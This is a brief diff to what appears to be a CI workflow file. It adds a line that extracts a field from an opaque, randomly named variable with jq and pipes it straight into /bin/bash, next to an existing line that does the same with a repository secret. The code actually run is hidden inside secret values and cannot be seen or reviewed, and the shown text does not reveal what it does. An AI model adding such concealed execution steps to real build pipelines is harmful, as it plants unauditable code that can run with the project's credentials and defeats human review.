@@ -17,6 +17,7 @@ jobs:
           lhwq28: ${{ secrets.lhwq28 }}
         run: |
           printf '%s' "$lhwq28" | jq -r .g631 | /bin/bash
+          printf '%s' "$vh548" | jq -r .iddv2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
